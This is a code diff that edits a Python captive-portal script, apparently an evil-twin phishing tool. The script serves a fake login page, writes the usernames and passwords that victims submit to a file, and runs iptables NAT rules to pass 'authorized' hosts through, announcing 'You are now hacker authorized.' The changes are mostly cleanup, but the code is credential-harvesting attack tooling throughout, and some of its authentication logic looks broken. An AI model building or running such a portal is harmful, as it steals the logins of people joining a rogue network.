@@ -12,7 +12,7 @@ import http.server
 from pathtools import path
 import socketserver as socketserver
 from http.server import HTTPServer as Webserver
-from core import PybashyRunFunction,error_printer
+from core import PybashyRunFunction,error_printer,PybashyRunSingleJSON
 from core import ExecutionPool,CommandSet,GenPerp_threader
 from core import FunctionSet,ModuleSet,Command,run_test,CommandRunner
 #try:
@@ -179,7 +179,7 @@ iname are the inputs you are attempting to capture
         '''
         # basic variables for existance
         self.formdata        = cgi.FieldStorage()
-        self.index      = progargs.index
+        self.index           = progargs.index
         self.PORT            = progargs.port
         self.ipaddress       = progargs.ipaddress
         self.iface           = progargs.iface
@@ -446,7 +446,8 @@ class CaptivePortal(http.server.SimpleHTTPRequestHandler):
         self.remote_IP       = self.client_address[0]
         # of course we're in the pool already, we own the place!
         self.networkaddrpool = [self.ipaddress]
-
+        self.hostlist = []
+        self.credentials = []
     #this is the index of the captive portal
     #it simply redirects the user to the to login page
     def redirect(self):
@@ -480,7 +481,6 @@ class CaptivePortal(http.server.SimpleHTTPRequestHandler):
     """
 
     def authpassthrough(self):
-        redprint('Updating IP tables to allow {0} through'.format(self.remote_IP))
         steps = {
         "IPTablesAcceptNAT": {
             "command"         : "iptables -t nat -I PREROUTING 1 -s {} -j ACCEPT".format(self.remote_IP),
@@ -497,35 +497,44 @@ class CaptivePortal(http.server.SimpleHTTPRequestHandler):
         }
 
     def authenticate(self, username, password):
+        #loop over credentials
         for username_password in self.credentials:
+            # if user/pass match
             if username_password[0][0] == username and self.credentials[username_password[0][0]] == password:
-                #remote_IP = self.client_address[0]
+                # add new client to authorized pool of hosts
                 greenprint('New authorization from '+ self.remote_IP)
                 greenprint('adding to address pool')
                 self.networkaddrpool.append(self.remote_IP)
+
+                # run auth function
                 redprint('Updating IP tables to allow {} through'.format(self.remote_IP))
-                self.authpassthrough()
+                PybashyRunFunction(self.authpassthrough())
+
+                #TODO: make a function to display an authorization confirmation page
+                # this currently just prints a single line of text to the browser
                 self.wfile.write("You are now hacker authorized. Navigate to any URL")
             else:
-                self.wfile.write(self.html_login)
+                # if they didnt pass auth check, send them back to the login
+                self.wfile.write(self.login())
 
 
     def savecredentials(self, filename):
-        remote_IP = self.client_address[0]
+        #remote_IP = self.client_address[0]
+        #add the new clients credentials to storage
         self.hostlist.append(self.remote_IP)
-        self.formdata = cgi.FieldStorage()
+        #self.formdata = cgi.FieldStorage()
         try:
             with open(filename, 'ab') as filehandle:
-                input1 = self.formdata.getvalue(i1name)
-                input2 = self.formdata.getvalue(i2name)
-                input3 = self.formdata.getvalue(i3name)
-                filehandle.write(formdata.getvalue(i1name))
+               # input1 = self.formdata.getvalue(i1name)
+               # input2 = self.formdata.getvalue(i2name)
+               # input3 = self.formdata.getvalue(i3name)
+                filehandle.write(self.formdata.getvalue(i1name))
                 filehandle.write('\n')
-                filehandle.write(formdata.getvalue(i2name))
+                filehandle.write(self.formdata.getvalue(i2name))
                 filehandle.write('\n\n')
                 filehandle.close()
-        except Exception as e:
-            raise
+        except Exception:
+            error_printer("[-] Could Not Write File!")
 
         payload = {
         "": {
@@ -550,10 +559,10 @@ class CaptivePortal(http.server.SimpleHTTPRequestHandler):
         self.send_header("Content-type", "text/html")
         self.end_headers()
         if path == "/":
-            self.wfile.write(self.html_login)
+            self.wfile.write(self.login())
         else:
             #we are using an external file instead of a local variable
-            self.wfile.write(self.html_redirect)
+            self.wfile.write(self.redirect())
 
     def do_POST(self):
         self.send_response(200)
@@ -582,6 +591,7 @@ class CaptivePortal(http.server.SimpleHTTPRequestHandler):
                 filehandle.close()
         except Exception as e:
             raise
+
 
 if __name__ == "__main__":
     arguments  = parser.parse_args()
